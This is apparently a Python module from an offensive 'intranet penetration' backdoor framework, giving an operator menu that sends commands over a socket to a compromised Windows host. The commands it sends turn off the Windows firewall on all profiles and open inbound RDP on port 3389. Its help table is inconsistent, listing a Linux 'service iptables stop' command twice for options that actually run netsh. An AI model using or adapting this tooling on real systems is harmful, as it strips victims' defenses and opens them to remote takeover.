import struct
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.history import InMemoryHistory
from AuxiliaryFunctions import MyTable


def SpecificInformation(conn):
    commands = ["back", "show functions"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor/Information ~ Firewall Information Query] \033[0m')
    history = InMemoryHistory()
    while True:
        choice = prompt(formatted_text1, completer=completer, history=history)
        if choice.lower() == 'show functions':
            show_functions()
            continue
        elif choice == 'back':
            break
        elif choice == '1':
            command = "netsh firewall set opmode disable"
            receive(conn, command)
            continue
        elif choice == '2':
            command = "netsh advfirewall set allprofiles state off"
            receive(conn, command)
            continue
        elif choice == '3':
            command = "netsh firewall show config"
            receive(conn, command)
            continue
        elif choice == '4':
            command = "netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow"
            receive(conn, command)
            continue


def receive(conn, command):
    conn.sendall(command.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break


def show_functions():
    print("\n" + '\033[1;34;34m' + "Domain Information Query" + '\033[0m' + "\n" + '=' * len("Domain Information Query") + "\n")
    headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model", '\033[1;34;34m' + "description" + '\033[0m']
    mydata = [["1", "service iptables stop", "关闭防火墙(Windows Server 2003及之前的版本)"],
              ["2", "service iptables stop", "关闭防火墙(Windows Server 2003及之前的版本)"],
              ["3", "View firewall configuration", "查看防火墙配置"], ["4", "Allow 3389 port open", "允许3389端口放行"]]
    MyTable.createTable(headers, mydata)
